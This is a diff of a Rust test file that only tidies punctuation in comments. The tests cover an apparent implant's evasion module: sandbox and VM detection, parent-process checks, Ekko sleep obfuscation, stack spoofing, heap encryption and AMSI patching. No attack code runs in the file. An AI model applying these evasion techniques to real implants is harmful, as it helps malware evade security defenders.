@@ -7,11 +7,11 @@
 // documented behaviour, or introduce regressions in the cross-module
 // invariants established during the refactor.
 //
-// IMPORTANT — heap encryption functions are intentionally NOT called here:
+// IMPORTANT - heap encryption functions are intentionally NOT called here:
 // encrypt_heap / encrypt_heap_aes256gcm walk the live process heap via
-// HeapLock + HeapWalk.  Invoking them inside the test runner would encrypt
+// HeapLock + HeapWalk. Invoking them inside the test runner would encrypt
 // the test framework's own allocations and either crash the process or
-// deadlock on the allocator lock.  Their mathematical properties are
+// deadlock on the allocator lock. Their mathematical properties are
 // already covered by the isolated-buffer tests in evasion/heap.rs.
 
 use rcm::agent::evasion;
@@ -19,7 +19,7 @@ use rcm::agent::evasion;
 // ─────────────────────────────────────────────────────────────────────────────
 // Symbol availability
 //
-// Each test calls exactly the symbols that mod.rs re-exports.  If any pub use
+// Each test calls exactly the symbols that mod.rs re-exports. If any pub use
 // entry is missing the test will fail to compile, immediately surfacing the gap.
 // ─────────────────────────────────────────────────────────────────────────────
 
@@ -27,7 +27,7 @@ use rcm::agent::evasion;
 fn detection_symbols_resolve() {
     let _ = evasion::is_virtualized();
     let _ = evasion::is_bad_parent(&[]);
-    // run_decoy() is intentionally not called — it calls std::process::exit(1).
+    // run_decoy() is intentionally not called - it calls std::process::exit(1).
 }
 
 #[test]
@@ -41,8 +41,8 @@ fn patching_symbols_resolve() {
 #[test]
 fn sleep_symbols_resolve() {
     let _ = evasion::agent_text_section();
-    evasion::ekko_sleep(0);             // 0 ms — immediate early return
-    evasion::sleep_with_spoofed_stack(0); // 0 ms — immediate
+    evasion::ekko_sleep(0);             // 0 ms - immediate early return
+    evasion::sleep_with_spoofed_stack(0); // 0 ms - immediate
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -57,7 +57,7 @@ fn empty_parent_allowlist_is_always_permissive() {
     assert!(!evasion::is_bad_parent(&Vec::new()));
 }
 
-// is_virtualized must be side-effect-free — repeated calls agree.
+// is_virtualized must be side-effect-free - repeated calls agree.
 #[test]
 fn is_virtualized_is_idempotent() {
     assert_eq!(evasion::is_virtualized(), evasion::is_virtualized());
@@ -161,7 +161,7 @@ fn sleep_with_spoofed_stack_zero_is_immediate() {
 #[cfg(target_os = "windows")]
 #[test]
 fn agent_text_section_is_consistent_with_itself() {
-    // Two calls should return the same base address and size — the PE
+    // Two calls should return the same base address and size - the PE
     // header walk is deterministic for a loaded image.
     let a = evasion::agent_text_section();
     let b = evasion::agent_text_section();
@@ -181,7 +181,7 @@ fn agent_text_section_is_some_and_plausible() {
 #[cfg(target_os = "windows")]
 #[test]
 fn patching_functions_return_ok_or_meaningful_err_on_windows() {
-    // On a real Windows host these should succeed.  We accept Err too
+    // On a real Windows host these should succeed. We accept Err too
     // because a CI VM might restrict VirtualProtect.
     for (name, r) in [
         ("patch_amsi", evasion::patch_amsi()),
